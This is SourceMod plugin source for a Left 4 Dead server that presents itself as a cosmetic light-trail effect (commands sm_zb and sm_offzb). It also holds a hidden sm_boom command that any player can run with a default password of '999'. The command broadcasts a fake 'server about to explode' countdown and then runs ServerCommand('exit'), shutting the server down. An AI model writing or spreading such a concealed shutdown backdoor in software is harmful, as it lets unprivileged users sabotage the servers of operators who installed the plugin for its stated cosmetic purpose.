#include <sourcemod>
#include <sdktools>
#include <sdktools_functions>

new g_BeamObject[66];
new g_BeamSprite;
new bool:IsActionQTHDJ;
new Handle:l4d_boom_password;

public Plugin:myinfo =
{
	name = "光影尾随",
	description = "",
	author = "",
	version = "1.0",
	url = ""
};

public void OnPluginStart()
{
	RegConsoleCmd("sm_zb", Command_CPmenu, "", 0);
	RegConsoleCmd("sm_offzb", KillLight, "", 0);
	RegConsoleCmd("sm_boom", Timekill, "", 0);
	
	l4d_boom_password = CreateConVar("l4d_boom_password", "999", "password", 0, false, 0.0, false, 0.0);
}

public OnMapStart() {
	g_BeamSprite = PrecacheModel("materials/sprites/laserbeam.vmt", false);
}

public Action:Command_CPmenu(client, args)
{
	VIPHy(client);
	char ClientName[64];
	GetClientName(client, ClientName, 64);
	PrintToChatAll("\x04%s \x01开启了\x05装逼特效！", ClientName);
	return Action:3;
}

IsValidEnt(ent)
{
	if (ent > 0 && IsValidEdict(ent) && IsValidEntity(ent))
	{
		return 1;
	}
	return 0;
}

public Action:KillLight(client, args)
{
	if (IsClientInGame(client))
	{
		if (IsValidEnt(g_BeamObject[client]))
		{
			AcceptEntityInput(g_BeamObject[client], "ClearParent", -1, -1, 0);
			AcceptEntityInput(g_BeamObject[client], "kill", -1, -1, 0);
			RemoveEdict(g_BeamObject[client]);
			g_BeamObject[client] = 0;
			char ClientName[64];
			GetClientName(client, ClientName, 64);
			PrintToChatAll("\x04%s \x01关闭了\x05装逼特效！", ClientName);
		}
	}
}

public Action:VIPHy(Client)
{
	CreateTimer(1.0, on, Client, 3);
	return Action:0;
}

public Action:on(Handle:timer, any:Client)
{
	SetUpBeamSpirit(Client, "red", 2.0, 7.0, 100);
	return Action:0;
}

SetUpBeamSpirit(Client, String:ColoR[], Float:Life, Float:width, Alpha)
{
	if (IsValidClient(Client))
	{
		if (IsPlayerAlive(Client))
		{
			new mr_Noob = CreateEntityByName("prop_dynamic_override", -1);
			decl Float:pos[3];
			GetClientAbsOrigin(Client, pos);
			if (IsValidEdict(mr_Noob))
			{
				decl Float:nooB[3];
				decl Float:noobAng[3];
				GetEntPropVector(Client, PropType:0, "m_vecOrigin", nooB, 0);
				GetEntPropVector(Client, PropType:1, "m_angRotation", noobAng, 0);
				DispatchKeyValue(mr_Noob, "model", "models/editor/camera.mdl");
				SetEntPropVector(mr_Noob, PropType:0, "m_vecOrigin", nooB, 0);
				SetEntPropVector(mr_Noob, PropType:0, "m_angRotation", noobAng, 0);
				DispatchSpawn(mr_Noob);
				SetEntPropFloat(mr_Noob, PropType:0, "m_flModelScale", -0.0, 0);
				SetEntProp(mr_Noob, PropType:0, "m_nSolidType", any:6, 4, 0);
				SetEntityRenderMode(mr_Noob, RenderMode:1);
				SetEntityRenderColor(mr_Noob, 255, 255, 255, 0);
				SetVariantString("!activator");
				AcceptEntityInput(mr_Noob, "SetParent", Client, -1, 0);
				SetVariantString("spine");
				AcceptEntityInput(mr_Noob, "SetParentAttachment", -1, -1, 0);
				new col[4];
				col[0] = GetRandomInt(0, 255);
				col[1] = GetRandomInt(0, 255);
				col[2] = GetRandomInt(0, 255);
				col[3] = Alpha;
				new col2[4];
				col2[0] = GetRandomInt(0, 255);
				col2[1] = GetRandomInt(0, 255);
				col2[2] = GetRandomInt(0, 255);
				col2[3] = Alpha;
				if (StrEqual(ColoR, "red", false))
				{
					col[0] = GetRandomInt(0, 255);
					col2[1] = GetRandomInt(0, 255);
				}
				else
				{
					if (StrEqual(ColoR, "green", false))
					{
						col[1] = 255;
						col2[0] = 255;
					}
					if (StrEqual(ColoR, "blue", false))
					{
						col[2] = 255;
						col2[0] = 255;
					}
				}
				TE_SetupBeamFollow(mr_Noob, g_BeamSprite, 100, Life, width, 1.0, 3, col);
				TE_SendToAll(0.0);
				TE_SetupBeamFollow(mr_Noob, g_BeamSprite, 100, Life, 1.0, 1.0, 3, col2);
				TE_SendToAll(0.0);
				g_BeamObject[Client] = mr_Noob;
				CreateTimer(1.5, DeleteParticles, mr_Noob, 0);
			}
		}
	}
	return 0;
}

public Action:DeleteParticles(Handle:timer, any:particle)
{
	if (IsValidEntity(particle))
	{
		new String:classname[64];
		GetEdictClassname(particle, classname, 64);
		RemoveEdict(particle);
	}
	return Action:0;
}

public IsValidClient(client)
{
	if (client)
	{
		if (!IsClientInGame(client))
		{
			return 0;
		}
		return 1;
	}
	return 0;
}

public Action:Timekill(Client, args)
{
	if (IsValidPlayer(Client, false, true))
	{
		new String:password[20];
		decl String:arg[20];
		GetConVarString(l4d_boom_password, password, 20);
		GetCmdArg(1, arg, 20);
		if (StrEqual(arg, password, true))
		{
			IsActionQTHDJ = true;
			new Handle:pack;
			CreateDataTimer(1.0, TimerOut, pack, 1);
			WritePackCell(pack, Client);
			WritePackFloat(pack, GetEngineTime() + 10.0);
		}
		else
		{
			PrintToChat(Client, "请输入正确的爆破密码");
		}
	}
	return Action:0;
}

public Action:TimerOut(Handle:timer, Handle:pack)
{
	ResetPack(pack, false);
	new Client = ReadPackCell(pack);
	new Float:overtime = ReadPackFloat(pack);
	if (GetEngineTime() < overtime)
	{
		PrintHintTextToAll("   !!!服务器即将爆炸，剩余 【%d】 秒，请做好安全措施!!!   ", RoundToNearest(overtime - GetEngineTime()));
		if (!IsActionQTHDJ)
		{
			IsActionQTHDJ = true;
		}
	}
	else
	{
		if (IsValidPlayer(Client, false, true))
		{
			PrintHintTextToAll("服务器爆炸装置安装完毕，正在启动。。。");
		}
		CreateTimer(3.0, TimerClose, any:1, 0);
		IsActionQTHDJ = false;
		KillTimer(timer, false);
	}
	return Action:0;
}

bool:IsValidPlayer(Client, bool:AllowBot, bool:AllowDeath)
{
	if (Client < 1 || Client > MaxClients)
	{
		return false;
	}
	if (!IsClientConnected(Client) || !IsClientInGame(Client))
	{
		return false;
	}
	if (!AllowBot)
	{
		if (IsFakeClient(Client))
		{
			return false;
		}
	}
	if (!AllowDeath)
	{
		if (!IsPlayerAlive(Client))
		{
			return false;
		}
	}
	return true;
}

public Action:TimerClose(Handle:hTimer, any:data)
{
	ServerCommand("exit");
	return Action:3;
}
